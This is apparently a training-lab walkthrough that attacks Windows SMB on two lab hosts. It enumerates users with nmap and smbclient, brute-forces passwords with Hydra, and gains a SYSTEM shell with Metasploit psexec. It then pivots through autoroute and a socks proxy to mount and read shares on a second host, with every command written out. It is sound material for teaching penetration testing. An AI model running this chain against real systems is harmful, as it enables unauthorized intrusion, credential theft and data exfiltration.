# NetBIOS Hacking (Lab)

You will learn to enumerate the SMB service and exploit it using different brute-forcing and exploitation tools. Also, it covers pivoting and how to leverage net utility to mount the shared drives in the pivot network.

## Lab Environment

In this lab environment, the user will access a Kali GUI instance. A vulnerable SMB service can be accessed using the tools installed on Kali on \[http://demo.ine.local] and \[http://demo1.ine.local.]

**Objective:** Exploit both the target and find the flag!

## Tools

The best tools for this lab are:

* Metasploit Framework
* Nmap
* Hydra
* Proxychains

***

**Step 1:** Open the lab link to access the Kali GUI instance.

<figure><img src="https://assets.ine.com/lab/learningpath/04fa9fb16096a88aaca2d96a3cc989baabac25b29a9c7b442601332a4765c186.jpg" alt=""><figcaption></figcaption></figure>

**Step 2:** Check if the provided machine/domain is reachable.

**Commands:**

```
ping -c 5 demo.ine.local
ping -c 5 demo1.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/15179b510d30d232ca403fe8c685f645330154a8541a01fce80937726ab59cb9.jpg" alt=""><figcaption></figcaption></figure>

Only one provided machine is reachable, i.e., demo.ine.local, and we also found the target's IP addresses.

**Step 3:** Check open ports on the demo.ine.local machine.

**Command:**

```
nmap demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/f7be038f108618e47bf65d20fe0abd65846d133e977a1cac3f5b28f83dee473a.jpg" alt=""><figcaption></figcaption></figure>

Multiple ports are open on the demo.ine.local machine.

All the ports expose core services of the Windows operating system, i.e., SMB, RDP, RPC, etc.

In this lab, we will perform attacks on the SMB service.

**Note:** The Server Message Block (SMB) protocol is a network file sharing protocol that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. SMB can also communicate with any server program that is set up to receive an SMB client request. Source: \[https://docs.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview]

By default, the SMB service uses either IP port 139 or 445. Also, it is by default installed and present in every windows operating system. However, we can disable or remove it from the system.

There are multiple versions of the SMB protocol.

* SMB1
* SMB 2.0
* SMB 2.1
* SMB 3.0
* SMB 3.0.2
* SMB 3.1.1

SMBv1: Server Message Block (SMB) is an application layer network protocol commonly used in Microsoft Windows to provide shared access to files and printers. SMBv1 is the original protocol developed in the 1980s, making it more than 30 years old. More secure and efficient versions of SMB are available today. The SMBv1 protocol is not safe to use. By using this old protocol, you lose protections such as pre-authentication integrity, secure dialect negotiation, encryption, disabling insecure guest logins, and improved message signing. Microsoft has advised customers to stop using SMBv1 because it is extremely vulnerable and full of known exploits. WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems. Because of the security risks, support for SMBv1 has been disabled. Source: \[https://kb.iu.edu/d/aumn]

SMBv1 is used in the old Windows operating system. However, it is still present in the latest Windows OS too. We can disable/enable all SMB versions by modifying the windows registries.

SMBv1 onwards, all the versions are reasonability secure. They provide many security protections, i.e., disabling insecure guest logins, pre-authentication integrity, secure dialect negotiation, encryption, etc.

While scanning using nmap, we discovered the SMB service port 445.

To learn more about all protocol versions and changes. Please refer to the following link: \[https://en.wikipedia.org/wiki/Server\_Message\_Block]

Now, let's perform enumeration and exploitation of the SMB protocol.

**Step 4:** Let's run nmap on port 445 to get more information about the protocol.

**Command:**

```
nmap -sV -p 139,445 demo.ine.local
```

`-sV`: Probe open ports to determine service/version info

`-p 139,445`: Only scan specified ports

<figure><img src="https://assets.ine.com/lab/learningpath/1d4e3dbbb378f0961c3ddd53641b739acf1ff6fbfef8252f2a11144ba907fe86.jpg" alt=""><figcaption></figcaption></figure>

We have received information about both the ports. Also, identified that the target is `Microsoft Windows Server 2008 R2 - 2012`

**Step 5:** Now, let's identify all the supported SMB versions on the target machine.

We can quickly identify it using the nmap script smb-protocols.

**Command:**

```
nmap -p445 --script smb-protocols demo.ine.local
```

`-p445`: Only scan specified port.

`--script smb-protocols`: Script Scan

<figure><img src="https://assets.ine.com/lab/learningpath/feb5fc96b457c496a4f2e293d4c3702f535a668c90e1299de2df46de1622d64a.jpg" alt=""><figcaption></figcaption></figure>

We can notice that all three versions are accessible.

There is one more interesting nmap script for the smb protocol to find the security level of the protocol.

**Step 6:** Let's run the nmap script to find the smb protocol security level.

**Command:**

```
nmap -p445 --script smb-security-mode demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/1828b7e516ccb163b026c323530dc18774b73283d76601a59853d537921fceff.jpg" alt=""><figcaption></figcaption></figure>

We have tried to access the target SMB server using a guest user. We have received SMB security level information.

We can find more information from the following link: \[https://nmap.org/nsedoc/scripts/smb-security-mode.html]

This clarifies that the nmap script uses the `guest` user for all the smb script scan. We can define another user also. But, we need valid credentials to access the target machine.

The `guest` user is the default user available on all the windows operating systems.

If an attacker has valid credentials on the target machine. Then, command execution is possible. It depends on the user privilege.

Now, let's find that we have the `Null Session`, i.e `Anonymous` access on the target machine using the smbclient tool.

**smbclient**: smbclient is a client that can 'talk' to an SMB/CIFS server. It offers an interface similar to that of the ftp program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on.

**Step 7:** Let's run the smbclient tool to find that we have anonymous access on the target machine.

**Commands:**

```
smbclient -L demo.ine.local
Password for [WORKGROUP\root]: <enter>
```

<figure><img src="https://assets.ine.com/lab/learningpath/15852840ea32b06c50725ee9a35cf25d39b15717f88995988f8731b79dbbcb20.jpg" alt=""><figcaption></figcaption></figure>

We can access the target using anonymous login.

**Step 8:** Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.

Let's find all the present users using nmap smb-enum-users script.

**Command:**

```
nmap -p445 --script smb-enum-users.nse demo.ine.local
```

<figure><img src="https://assets.ine.com/lab/learningpath/19890f77176095a5f00492435446d860b59a62f7ac89c11c3c45ee69bbb94acf.jpg" alt=""><figcaption></figcaption></figure>

There are a total of four users present. `admin`, `administrator`, `root`, and `guest`

The guest and administrator users are built-in accounts.

Now, let's find the valid password for `admin`, `administrator`, and `root` user.

**Step 9:** First, let's create a file (users.txt) and keep all these users.

<figure><img src="https://assets.ine.com/lab/learningpath/c6bcb790a1b56c6c95e9269292f4379e1ce195bded7555b1e13b011e8180c2a4.jpg" alt=""><figcaption></figcaption></figure>

Now, let's run the hydra tool for brute-forcing the SMB protocol to find the valid password of the provided users.

**Command:**

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
```

`-L`: List of users

`-P`: Password list

`demo.ine.local smb`: Target Address and Target Protocol

<figure><img src="https://assets.ine.com/lab/learningpath/9364232a1e225dba9dacf2f7701bb7fa82814c372fe95aaa08cf4b7353db0d1e.jpg" alt=""><figcaption></figcaption></figure>

We have successfully retrieved valid passwords for all three users.

**Step 10:** Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.

**Microsoft Windows Authenticated User Code Execution:** This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. Source: \[https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/]

Let's start the Metasploit framework and exploit it!

**Commands:**

**Note:** If the exploit won't give you a meterpreter session. Try again!

```
msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
exploit
```

<figure><img src="https://assets.ine.com/lab/learningpath/86b57681b92657f5b229d190582322785be828e369cc2b0984121a45c6f7579d.jpg" alt=""><figcaption></figcaption></figure>

Success!. We have received a meterpreter session.

**Step 11:** Now, we will discover target machine information, e.g., current user, system information, arch, etc.

**Commands:**

```
getuid
sysinfo
```

<figure><img src="https://assets.ine.com/lab/learningpath/a897c13f6acba414f13d6c222cd8796bcca7b35a3f064db2bb2e57b58509285a.jpg" alt=""><figcaption></figcaption></figure>

We notice that target is running a windows server, and we have received a meterpreter session with "SYSTEM" (or "NT Authority") privileges on the machine.

**Step 12:** Let's read the flag.

**Command:**

```
cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
```

<figure><img src="https://assets.ine.com/lab/learningpath/096ed7c2e641c86a56098f428c73411180b6a991dfe59c7014cf4ddb3230dc26.jpg" alt=""><figcaption></figcaption></figure>

We have found the FLAG1: `8de67f44f49264e6c99e8a8f5f17110c`

**Step 13:** Let's check if we can access `demo1.ine.local` from the compromised host.

Before, ping to the second target machine from the compromised host. We need to know the IP address for the `demo1.ine.local` host.

Remember, when we did ping to both the targets and discovered IP addresses of these target machines:

1. demo.ine.local: 10.0.19.243
2. demo1.ine.local : 10.0.28.125

Now, let's ping to the 10.0.28.125 and verify that it is reachable from the second machine.

**Commands:**

```
shell
ping 10.0.28.125
```

<figure><img src="https://assets.ine.com/lab/learningpath/d26823a4a8830d93a7b3a7c348950b3cfa18414b3cea7396e4f10a5921227d14.jpg" alt=""><figcaption></figcaption></figure>

We can access the demo1.ine.local machine, i.e., 10.0.28.125.

However, we cannot access that machine (10.0.28.125) from the Kali machine. So, here we need to perform pivoting by adding route from the Metasploit framework.

**Step 14:** Let's add the route using the meterpreter session and identify the second machine service.

**Commands:**

```
CTRL + C
y
run autoroute -s 10.0.28.125/20
```

<figure><img src="https://assets.ine.com/lab/learningpath/a685a54b63dc873a30f0b6a9c35a6c73e6e91a51c09e572fe1e36be87a1fd367.jpg" alt=""><figcaption></figcaption></figure>

We have successfully added the route to access the demo1.ine.local machine.

**Step 15:** Now, let's start the socks proxy server to access the pivot system on the attacker's machine using the proxychains tool.

First start the `socks4a` server using the Metasploit module.

**Socks4a Proxy Server:** This module provides a socks4a proxy server with built-in Metasploit routing to relay connections. Source:: \[https://www.rapid7.com/db/modules/auxiliary/server/socks4a/]

**Note:** The proxychains should have configured with the following parameters (at the end of /etc/proxychains4.conf):

**Command:**

```
cat /etc/proxychains4.conf
```

<figure><img src="https://assets.ine.com/lab/learningpath/f121614262d9ec54da61d061098292c9ec32925cb16c05a89fe3abdeb3df99c8.jpg" alt=""><figcaption></figcaption></figure>

We can notice, socks4 port is 9050.

Now, let's run the Metasploit socks proxy auxiliary server module on port 9050.

**Commands:**

```
background
use auxiliary/server/socks_proxy
show options
```

<figure><img src="https://assets.ine.com/lab/learningpath/a92fbd56c9ccedc86f260e736f217682270c5bce40bdec0bec556044858682a6.jpg" alt=""><figcaption></figcaption></figure>

We notice that SRVPORT is 1080, and VERSION is 5 mentioned in the module options. But, we need to set the port to 9050 and the version to 4a. Let's change both the values then run the server.

**Commands:**

```
set SRVPORT 9050
set VERSION 4a 
exploit
jobs
```

<figure><img src="https://assets.ine.com/lab/learningpath/5c5f5ff5ba2d1c9d86a1316af8d94416fc8562af30ad47eff42aa20fcfcc2b8f.jpg" alt=""><figcaption></figcaption></figure>

We can notice that the server is running perfectly.

**Step 16:** Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. `demo1.ine.local`

We could also specify multiple ports. But, in this case, we are only interested in SMB service.

**Command:**

```
proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
```

`demo1.ine.local`: The pivot machine

`-sT`: TCP connect scan

`-Pn`: Skip host discovery and force port scan.

`-sV`: Probe open ports to determine service/version info

`-p 445`: Define port to scan

This scan is the safest way to identify the open ports. We could use an auxiliary TCP port scanning module. But those are very aggressive and can kill your session.

<figure><img src="https://assets.ine.com/lab/learningpath/6a3f51ad823de612d537daa5cc478eaf3a27893674a4857927d1886eed6cd2df.jpg" alt=""><figcaption></figcaption></figure>

We notice that port 445 is open on the target machine.

**Step 17:** Now, let's use the net view command to find all resources shared by the demo1.ine.local machine.

Interact with the meterpreter session again.

**Commands:**

```
sessions -i 1
shell
net view 10.0.28.125
```

<figure><img src="https://assets.ine.com/lab/learningpath/997e3473cab9570090af98e9c8d0f9fb35176115f0a2bf79827dc3ba49bc18c4.jpg" alt=""><figcaption></figcaption></figure>

We have received the Access is denied. message.

Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.

**Commands:**

```
CTRL + C
migrate -N explorer.exe
shell
net view 10.0.28.125
```

<figure><img src="https://assets.ine.com/lab/learningpath/cdb15f22d4932e994b8b52dc66250d80893bc0c599a2bdd9be35d4212eacc6be.jpg" alt=""><figcaption></figcaption></figure>

This time we can see two shared resources. Documents and K drive. And, this confirms that pivot target (demo1.ine.local) allows Null Sessions, so we can access the shared resources. Also, we can achieve the same goal in several ways.

**Step 18:** Now, we can map the shared drive to the demo.ine.local machine using the' net' command.

Let's map the shared resources, i.e., the Documents and K drive.

**Commands:**

```
net use D: \\10.0.28.125\Documents
net use K: \\10.0.28.125\K$
```

<figure><img src="https://assets.ine.com/lab/learningpath/e1e507f4167540dcfa27c5204c55e87e80a12c1f4c6cfa7579ff6adebc55c212.jpg" alt=""><figcaption></figcaption></figure>

We successfully mapped the resources to D and K drives.

**Step 19:** Let's check what is inside these mapped drives.

**Commands:**

```
dir D:
dir K:
```

<figure><img src="https://assets.ine.com/lab/learningpath/b24cfdea5e3e8936649a596c0397482f6f718022d948b82308d78094f0c54ba9.jpg" alt=""><figcaption></figcaption></figure>

Now that we can browse the shares content, we can download or read it on the attacker's machine.

Let's read the FLAG2 and Confidential.txt files.

**Commands:**

```
CTRL + C
cat D:\\Confidential.txt
cat D:\\FLAG2.txt
```

<figure><img src="https://assets.ine.com/lab/learningpath/ea92c1aaace44dd32d2e59b1e16cdb37d3946d74649476ce81e7db5d1304cb7a.jpg" alt=""><figcaption></figcaption></figure>

<figure><img src="https://assets.ine.com/lab/learningpath/b7acbdc7449febf546a7d3aac410c4b7d45450e08dd61b128bf92ce019a5499a.jpg" alt=""><figcaption></figcaption></figure>

We have found the **FLAG2:** c8f58de67f44f49264e6c99e8f17110c

This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.
